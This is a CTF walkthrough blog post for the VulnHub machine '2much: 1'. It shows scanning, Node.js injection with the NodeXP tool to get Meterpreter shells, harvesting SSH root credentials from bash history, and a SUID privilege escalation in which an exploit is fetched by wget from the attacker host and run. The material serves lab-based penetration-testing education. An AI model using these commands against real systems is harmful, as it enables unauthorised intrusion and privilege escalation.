<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">2much: 1: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/2much-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-03-13T15:31:12+00:00">March 13, 2020</time><time class="updated" datetime="2025-06-10T20:10:40+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to crack the 2much: 1 Capture the Flag Challenge and present a detailed walkthrough. The machine depicted in this Walkthrough is hosted on Vulnhub. Credit for making this machine goes to <strong><a style="color: #000000;" href="https://twitter.com/4nqr34z">4ndr34z</a></strong>. Download this lab by clicking <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/2much-1,319/">here</a></strong>.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Penetration Testing Methodology</span> </strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning </strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover scan</span></li>
<li><span style="color: #000000;">Nmap scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating HTTP service on Browser</span></li>
<li><span style="color: #000000;">js Vulnerable Detection</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Installation NodeXP</span></li>
<li><span style="color: #000000;">Getting meterpreter using NodeXP</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating for User Flag</span></li>
<li><span style="color: #000000;">Reading the User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating Bash History</span></li>
<li><span style="color: #000000;">Scripting for SUID</span></li>
<li><span style="color: #000000;">Exploiting SUID</span></li>
<li><span style="color: #000000;">Getting Root Access</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Network Scanning</span> </strong></span></h3>
<p><span style="color: #000000;">We downloaded, imported and ran the virtual machine (.ova) on the VMWare Workstation, the machine will automatically be assigned an IP address from the network DHCP. To begin we will find the IP Address of our Target Machine, for that we will use the following command as it helps to see all the IP’s in an internal network.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tFx2VMQf_BE/XmuboHCIsfI/AAAAAAAAi_U/Zb3DnRYO0x0dSVD5buHI5QoU9mDtP9_VACLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We found the target’s IP Address 192.168.0.109. The next step is to scan the target machine by using Nmap tool. This is to find the open ports and services on the target machine and will help us to proceed further</span></p>
<pre class="lang:default decode:true">nmap -sV -p- 192.168.0.109</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RCBXE-qAw1I/Xmubr4thQmI/AAAAAAAAi_4/naZo_UbK0xoFmCapjNsgkM74lTKjgNpVQCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">There were quite some services running on the system. But seeing port 80, we wanted to take a look at the webpage that is being hosted on it. We found the target machine riddled with all the Vulnerable Applications like DVWA, XVWA, etc. We tried to get to the system through those but was unsuccessful.</span></p>
<pre class="lang:default decode:true">http://192.168.0.109</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FVtq8aNKhso/XmubriDZQwI/AAAAAAAAi_0/27mS1YlNhf8HTzs34QbIt0RmufzIDUdMQCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">After going through the http services that we found in the nmap, we were running and checking each one of them one by one. Till we reached to a Nodejs Service on port 8081. Upon browsing the port, we saw that it gives back the message “Hello undefined”. This got us thinking that there must be a parameter here that will be defining the name which in our case was undefined.</span></p>
<pre class="lang:default decode:true">http://192.168.0.109:8081</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s1OnOT3KVNU/XmubsKa3FrI/AAAAAAAAi_8/yDAhnbnmNDoBrYsQFOcC1UKEy1hivXsRQCLcBGAsYHQ/s1600/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">We explored if we can tamper with this parameter manually. But it takes a lot of time. So, we found this this brilliant tool that will do the heavy lifting for us. As it is hosted on GitHub, we used the git clone command to clone the repository. After cloning, we get into the cloned directory to find the python script and other required files.</span></p>
<pre class="lang:default decode:true">git clone https://github.com/esmog/nodexp.git
cd nodexp/
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CcF9Z628YD8/XmubsjmNnKI/AAAAAAAAjAA/SxxqnOaecT4VNINnQPigPhAk1a_E6iywwCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We read the README that contained the syntax in which we need to provide the URL of the target.  We run the script as shown in the give image.</span></p>
<pre class="lang:default decode:true">python nodexp.py --url="http://192.168.0.109:8081/?name=[INJECT_HERE]"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R9wdgjwwl5A/Xmubs7UPgdI/AAAAAAAAjAE/YOnX3GkogGYmtVEsmmEm1VQNEJGH_lReQCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">The application runs and passes a number of parameters to determine if the Nodejs is vulnerable. After running for a while, it confirms that our target is indeed injectable. It asks if we want to generate a meterpreter shell. We enter ‘y’ for confirmation. After that, it asks us for our Local IP Address and port. We provide the IP Address and port of our Attacker Machine. After providing the details it loads the Metasploit Framework</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NXz_BHmKvtA/XmubtFzCaxI/AAAAAAAAjAI/utWQRiO3UAACllDXOf4Q-DvzF-pQKp54wCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">After we give our confirmation for the generation of the shell, the tool opens up a prompt which starts configuring the Metasploit Framework to attack the target machine.  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SSB20mK_ULU/XmubtgpSdCI/AAAAAAAAjAM/gyFJ_yj9F0sAQpFBJwLMcgXN16-P0kLnwCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now we see that Metasploit gets loaded and the payload is being uploaded. As soon as the upload of the payload completes 3 sessions are generated.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HHT9ivs1x3A/Xmubtz-ny-I/AAAAAAAAjAQ/mgNDIPGL0i016TrpU8hVnct25roeG3oNACLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We can check this using the sessions command in Metasploit Framework. As shown in the image given below we have 3 sessions from the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DqonZ3sIQlQ/Xmubn9OiMGI/AAAAAAAAi_M/OjM-iTpPxKsxPCpPcGwrBmoW3u6Kq-eJQCLcBGAsYHQ/s1600/10.png"/></span></p>
<h3><span style="color: #000000;"><strong>Post Exploitation</strong></span></h3>
<p><span style="color: #000000;">We interact with the third session using the -i parameter of the sessions command. The shell we got was an improper shell. We need to convert it into a TTY Shell. This can be achieved using the python one-liner. After gaining the TTY shell, we check the user with the id command. On further enumeration, we found a user.txt. We believe this is our first flag!!</span></p>
<pre class="lang:default decode:true">session -i 3
python -c 'import pty; pty.spawn("/bin.bash")'
id
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-okn_e1Ywwk8/Xmubn6hYrAI/AAAAAAAAi_Q/EIarmMp_7f4Oe7CwWqZxZN8Z2YEfsFRLQCLcBGAsYHQ/s1600/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">As a part of our Post Exploitation exercises, we browsed the .bash_history files. In this file, we found a set of SSH credentials as shown in the image given below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nxJFe2Na_lk/XmubpPjRI8I/AAAAAAAAi_c/Xnjk42gswCcnt8Q6-mqL5_2Nwg2bypnqQCLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We try to login via SSH as the root user using the aforementioned credentials. This gave us a root shell. But something tells us that the game isn’t over yet. We ran the ip addr command to get the information about the network configurations of this machine. We found an internal IP Address: 172.17.0.4/16. This IP Address tells us that we are in a docker.</span></p>
<pre class="lang:default decode:true">ssh root@127.0.0.1 -p23
3236$fsdfzcv_cs
ip addr</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0XgsHD1Q4aM/XmubpL0NTeI/AAAAAAAAi_Y/WUpdWCVLd40zBnSm1DGhw1WW-Olsq1zuQCLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Moving on, we scanned the directory for files and found a file named tdl.txt. Upon opening it we see that it tells us that we have port 21 and Anonymous Access is allowed. We log out the SSH session and try to look for the same tdl.txt file in the host machine. Upon proper enumeration, we saw that the same tdl.txt file was available in /home/4ndr34z/ftp/. This means this directory is shared with the docker.</span></p>
<pre class="lang:default decode:true">ls
cat tdl.txt
logout
ls -a
cd ftp
ls
cat tdl.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tTXRaRZVWY4/Xmubpci-hdI/AAAAAAAAi_g/YDRRU3reS840Vb6zIF2PpgZrMOcxJfLgACLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">This means that we can escalate privilege using the SSH connection. We could login as root on the docker and leave a file to invoke access there. Then log out from docker and come back to the target system and execute it. We are going to use the following script for the escalating privilege.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4bgZXR0Lltw/XmubqBl9ZcI/AAAAAAAAi_k/HRn7eBsa-gYqn0kf7qjXFcJxRWxI210CgCLcBGAsYHQ/s1600/15.png"/></span></p>
<p><span style="color: #000000;">As the script in C, we complied the script using gcc as shown in the image given below. After compiling, we share the file via HTTP server that is generated using a python one-liner.</span></p>
<pre class="lang:default decode:true">gcc exploit.c -o exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oAVDd1g2P0g/Xmubq9YTIWI/AAAAAAAAi_s/9CjJ3ATvjbI9lILo48Zshg3tSZHDXjlYgCLcBGAsYHQ/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now we login as root in the docker as we did earlier. Then we will download exploit binary that we hosted using wget command as shown in the image given below. As it is a SUID, we need to give it proper permissions. We do this using the chmod command.</span></p>
<pre class="lang:default decode:true">ssh root@127.0.0.1 -p 23
wget http://192.168.0.106:8000/exploit
chmod 4755 exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BT2JDedlz7k/XmubqgoskzI/AAAAAAAAi_o/To5EL8p2HtQOO6-ttjHBNChzcDei69w5wCLcBGAsYHQ/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now, we log out from the docker and traverse to the location of the file and executed the binary. Upon completion we see that we have the root privileges on this target machine. All that’s left is to read the root flag.</span></p>
<pre class="lang:default decode:true  ">logout
ls
./exploit
ls -a
cd /root
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aUnIOlndFAQ/XmubrT2YHrI/AAAAAAAAi_w/64w2blYdbhMPBmvHlmPwkx__0AAA7hgowCLcBGAsYHQ/s1600/18.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
